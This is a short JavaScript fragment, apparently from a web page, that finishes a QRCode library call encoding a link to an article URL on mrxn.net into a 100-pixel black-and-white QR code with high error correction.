text: encodeURI("https://mrxn.net/jswz/custom-zx-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 